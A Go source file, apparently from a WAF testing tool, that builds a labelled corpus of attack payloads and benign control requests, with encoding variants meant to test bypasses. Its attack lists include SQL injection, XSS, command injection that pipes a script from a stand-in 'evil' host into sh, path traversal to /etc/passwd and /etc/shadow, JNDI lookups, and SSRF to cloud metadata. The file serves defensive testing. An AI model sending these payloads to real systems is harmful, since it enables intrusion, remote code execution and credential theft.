// Package payloads 提供 W2 对抗驱动器使用的攻击语料库。
//
// 设计要点：
//  1. 语料含「攻击样本」与「良性对照样本」两类——后者用于测量误报率（WAF 的核心指标之一）；
//  2. 同一语义的攻击会给出多种变形（原始 / URL 编码 / 双重编码 / 大小写扰动 / 注释拆分），
//     以便量化「归一化层是否真的起作用」；
//  3. 每条样本有稳定 ID（W2-<类别>-<序号>），与 CSV 输出、后续绕过清单一一对应。
package payloads

import (
	"fmt"
	"net/url"
	"strings"
)

// Case 是一条待发送的样本。
type Case struct {
	ID       string
	Category string
	Name     string
	Method   string
	Path     string
	Query    string
	Body     string
	UA       string
	IsAttack bool // false 表示良性对照样本，被拦截即视为误报
}

// ---- 变形器 ----

func urlEnc(s string) string { return url.QueryEscape(s) }

// doubleEnc 模拟 %25xx 双重编码绕过。
func doubleEnc(s string) string { return url.QueryEscape(url.QueryEscape(s)) }

// caseMix 交替大小写，绕过大小写敏感的正则。
func caseMix(s string) string {
	var b strings.Builder
	upper := true
	for _, r := range s {
		if r == ' ' {
			b.WriteRune(r)
			continue
		}
		if upper {
			b.WriteString(strings.ToUpper(string(r)))
		} else {
			b.WriteString(strings.ToLower(string(r)))
		}
		upper = !upper
	}
	return b.String()
}

// commentSplit 用 SQL 注释拆分关键字（union/**/select）。
func commentSplit(s string) string {
	return strings.ReplaceAll(s, " ", "/**/")
}

// ---- 构造辅助 ----

func q(id, cat, name, query string, attack bool) Case {
	return Case{ID: id, Category: cat, Name: name, Method: "GET", Path: "/product", Query: query, IsAttack: attack}
}

func qp(id, cat, name, path, query string, attack bool) Case {
	c := q(id, cat, name, query, attack)
	c.Path = path
	return c
}

func b(id, cat, name, body string, attack bool) Case {
	return Case{ID: id, Category: cat, Name: name, Method: "POST", Path: "/api/parse",
		Body: body, IsAttack: attack}
}

func ua(id, cat, name, userAgent string) Case {
	return Case{ID: id, Category: cat, Name: name, Method: "GET", Path: "/", UA: userAgent, IsAttack: true}
}

// Corpus 返回全量语料（112 条：84 攻击 + 28 良性对照）。
func Corpus() []Case {
	var cs []Case
	add := func(list ...Case) { cs = append(cs, list...) }
	n := func(prefix string, i int) string { return fmt.Sprintf("%s-%03d", prefix, i) }

	// ========== SQL 注入（21 条）==========
	sqli := []string{
		"1 UNION SELECT username,password FROM users",
		"1 UNION ALL SELECT NULL,NULL,NULL",
		"1' UNION SELECT @@version--",
		"1 AND SLEEP(5)",
		"1' AND BENCHMARK(10000000,MD5('a'))--",
		"1 AND extractvalue(1,concat(0x7e,user()))",
		"1 AND updatexml(1,concat(0x7e,(SELECT database())),1)",
		"1' OR '1'='1",
		"1 OR 1=1",
		"1' AND '1'='1' --",
		"1; DROP TABLE users--",
		"1'] UNION SELECT 1,2,3--",
		"1 UNION SELECT table_name FROM information_schema.tables",
		"1 INTO OUTFILE '/var/www/shell.php'",
	}
	for i, p := range sqli {
		add(q(n("W2-SQLI", i+1), "sqli", "基础型 "+itoa(i+1), "id="+urlEnc(p), true))
	}
	// 变形：大小写 / 注释拆分 / 双重编码 / 换行
	base := "1 UNION SELECT 1"
	add(
		q(n("W2-SQLI", 20), "sqli", "大小写变形", "id="+urlEnc(caseMix(base)), true),
		q(n("W2-SQLI", 21), "sqli", "注释拆分", "id="+urlEnc(commentSplit(base)), true),
		q(n("W2-SQLI", 22), "sqli", "双重编码", "id="+doubleEnc("1' or 1=1"), true),
		q(n("W2-SQLI", 23), "sqli", "换行分割", "id=1%20union%0Aselect%201", true),
		q(n("W2-SQLI", 24), "sqli", "制表符分割", "id=1%20union%09select%201", true),
		q(n("W2-SQLI", 25), "sqli", "内联注释", "id=1%20union/**/all/**/select%201", true),
		q(n("W2-SQLI", 26), "sqli", "恒真式双重编码", "id=1%2527%2520or%25201%253D1", true),
	)

	// ========== XSS（15 条）==========
	xss := []string{
		"<script>alert(1)</script>",
		"<script src=//evil/x.js></script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
		"<iframe src=javascript:alert(1)>",
		"javascript:alert(document.cookie)",
		"<a href=\"javascript:alert(1)\">click</a>",
		"<input autofocus onfocus=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
		"%3Cscript%3Ealert(1)%3C/script%3E",
	}
	for i, p := range xss {
		add(qp(n("W2-XSS", i+1), "xss", "基础型 "+itoa(i+1), "/comment", "c="+urlEnc(p), true))
	}
	add(
		qp(n("W2-XSS", 14), "xss", "大小写变形", "/comment", "c="+urlEnc("<ScRiPt>alert(1)</sCrIpT>"), true),
		qp(n("W2-XSS", 15), "xss", "HTML 实体", "/comment", "c="+urlEnc("&lt;script&gt;alert(1)&lt;/script&gt;"), true),
		qp(n("W2-XSS", 16), "xss", "双重编码", "/comment", "c="+doubleEnc("<script>alert(1)</script>"), true),
	)

	// ========== 命令注入（12 条）==========
	rce := []string{
		"1.1.1.1;cat /etc/passwd",
		"1.1.1.1|whoami",
		"1.1.1.1&&id",
		"1.1.1.1||uname -a",
		"$(id)",
		"`whoami`",
		"1.1.1.1;curl http://evil/x.sh|sh",
		"1.1.1.1;wget http://evil/x -O /tmp/x",
		";powershell -c whoami",
		"1.1.1.1%0Acat%20/etc/passwd",
	}
	for i, p := range rce {
		add(qp(n("W2-RCE", i+1), "rce", "基础型 "+itoa(i+1), "/ping", "host="+urlEnc(p), true))
	}
	add(
		qp(n("W2-RCE", 11), "rce", "命令替换变形", "/ping", "host="+urlEnc("a$(cat /etc/passwd)b"), true),
		qp(n("W2-RCE", 12), "rce", "分号+空格变体", "/ping", "host="+urlEnc("1.1.1.1 ; cat /etc/passwd"), true),
	)

	// ========== 路径遍历（10 条）==========
	trav := []string{
		"../../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252fetc%252fpasswd",
		"/download?f=/etc/passwd",
		"../../../../etc/shadow",
		"..%5c..%5cboot.ini",
		"../../app/config/web.config",
		"....//....//....//etc/passwd",
	}
	for i, p := range trav {
		add(qp(n("W2-TRAV", i+1), "path-traversal", "基础型 "+itoa(i+1), "/download", "f="+p, true))
	}

	// ========== 反序列化 / JNDI（10 条）==========
	jndi := []string{
		"${jndi:ldap://evil/a}",
		"${jndi:rmi://evil:1099/a}",
		"${jndi:dns://evil/a}",
		"${${lower:j}ndi:ldap://evil/a}",
		"${jndi:ldap://evil/a}",
	}
	for i, p := range jndi {
		add(Case{ID: n("W2-DESER", i+1), Category: "deserialization", Name: "JNDI 变体 " + itoa(i+1),
			Method: "GET", Path: "/", UA: p, IsAttack: true})
	}
	add(
		b(n("W2-DESER", 6), "deserialization", "Fastjson autoType",
			`{"@type":"java.net.Inet4Address","val":"evil"}`, true),
		b(n("W2-DESER", 7), "deserialization", "Fastjson JdbcRowSetImpl",
			`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/a","autoCommit":true}`, true),
		b(n("W2-DESER", 8), "deserialization", "Java 序列化魔数",
			`rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==`, true),
		Case{ID: n("W2-DESER", 9), Category: "deserialization", Name: "JNDI 头部注入",
			Method: "GET", Path: "/", UA: "${jndi:ldap://evil/a}", IsAttack: true},
		b(n("W2-DESER", 10), "deserialization", "autoType 字段名变形",
			`{"@TYPE":"java.net.Inet4Address","val":"evil"}`, true),
	)

	// ========== SSRF（8 条）==========
	ssrf := []string{
		"http://127.0.0.1:6379/",
		"http://localhost:8080/admin",
		"http://169.254.169.254/latest/meta-data/",
		"http://0.0.0.0:22/",
		"file:///etc/passwd",
		"http://[::1]:80/",
		"http://127.0.0.1.nip.io/",
		"gopher://127.0.0.1:6379/_INFO",
	}
	for i, p := range ssrf {
		add(qp(n("W2-SSRF", i+1), "ssrf", "基础型 "+itoa(i+1), "/fetch", "url="+urlEnc(p), true))
	}

	// ========== 扫描器指纹（8 条）==========
	scanners := []string{"sqlmap/1.7.2#stable", "Nikto/2.1.6", "nmap scripting engine", "masscan/1.3",
		"Nessus SOAP", "Acunetix-Aspect", "gobuster/3.1.0", "Nuclei - Open-source project"}
	for i, s := range scanners {
		add(ua(n("W2-SCAN", i+1), "scanner", "UA 指纹 "+itoa(i+1), s))
	}

	// ========== 良性对照（28 条，用于误报率）==========
	// AUDIT P1-5：24-28 是本次审查后新增的误报面样本（只增不删，历史基线不受影响）。
	// 它们专打"正文讨论安全话题"这一类误报：技术文档里出现 javascript:、nmap 等词，
	// 不应被当成攻击。
	benign := []Case{
		q(n("W2-BENIGN", 1), "benign", "普通列表查询", "page=2&size=20", false),
		q(n("W2-BENIGN", 2), "benign", "搜索英文关键词", "q=golang+http+proxy", false),
		q(n("W2-BENIGN", 3), "benign", "搜索含 select 单词", "q=select+a+book+from+library", false),
		q(n("W2-BENIGN", 4), "benign", "搜索含 union 单词", "q=trade+union+news", false),
		q(n("W2-BENIGN", 5), "benign", "中文搜索", "q="+urlEnc("网络安全 漏洞 扫描器"), false),
		q(n("W2-BENIGN", 6), "benign", "带时间范围", "start=2026-01-01&end=2026-10-01", false),
		q(n("W2-BENIGN", 7), "benign", "排序参数", "sort=created_at&order=desc", false),
		q(n("W2-BENIGN", 8), "benign", "布尔标记", "is_active=true&is_deleted=false", false),
		q(n("W2-BENIGN", 9), "benign", "文件名含点", "file=report.v1.0.pdf", false),
		q(n("W2-BENIGN", 10), "benign", "多级路径", "/article/2026/10/26/detail", false),
		q(n("W2-BENIGN", 11), "benign", "UUID 参数", "id=550e8400-e29b-41d4-a716-446655440000", false),
		q(n("W2-BENIGN", 12), "benign", "邮箱字段", "email="+urlEnc("test@example.com"), false),
		q(n("W2-BENIGN", 13), "benign", "URL 字段（正常回调）", "callback="+urlEnc("https://api.example.com/notify"), false),
		q(n("W2-BENIGN", 14), "benign", "价格区间", "min=100&max=999.99", false),
		q(n("W2-BENIGN", 15), "benign", "含分号的文本", "title="+urlEnc("Plan A; review later"), false),
		q(n("W2-BENIGN", 16), "benign", "含单引号文本", "note="+urlEnc("It's a test"), false),
		q(n("W2-BENIGN", 17), "benign", "含括号文本", "desc="+urlEnc("total (13 items)"), false),
		b(n("W2-BENIGN", 18), "benign", "JSON 下单", `{"sku":"A-1","qty":2,"note":"deliver friday"}`, false),
		b(n("W2-BENIGN", 19), "benign", "JSON 含 type 字段", `{"type":"order","status":"paid"}`, false),
		b(n("W2-BENIGN", 20), "benign", "JSON 嵌套", `{"user":{"id":7,"name":"yin"},"items":[{"sku":"B-2"}]}`, false),
		b(n("W2-BENIGN", 21), "benign", "JSON 中文内容", `{"title":"安全工作台","tags":["安全","审计"]}`, false),
		{ID: n("W2-BENIGN", 22), Category: "benign", Name: "正常浏览器 UA", Method: "GET", Path: "/",
			UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0 Safari/537.36", IsAttack: false},
		q(n("W2-BENIGN", 23), "benign", "分页大值", "page=999&size=100", false),
		q(n("W2-BENIGN", 24), "benign", "搜索引号包裹", "q="+urlEnc(`"network security"`), false),
		// ---- AUDIT P1-5 新增（4 条，只增不删）----
		b(n("W2-BENIGN", 25), "benign", "正文讨论 js 伪协议", `{"doc":"javascript:void(0) 常用于阻止链接默认跳转"}`, false),
		b(n("W2-BENIGN", 26), "benign", "正文提到扫描器名", `{"doc":"工具对比：nmap 端口扫描、sqlmap 注入检测、nikto Web 检查"}`, false),
		q(n("W2-BENIGN", 27), "benign", "路径含加号", "/tag/c%2B%2B", false),
		b(n("W2-BENIGN", 28), "benign", "正文含等式说明", `{"doc":"表达式 1=1 在集合论里表示全集"}`, false),
	}
	add(benign...)

	return cs
}

func itoa(i int) string { return fmt.Sprintf("%d", i) }
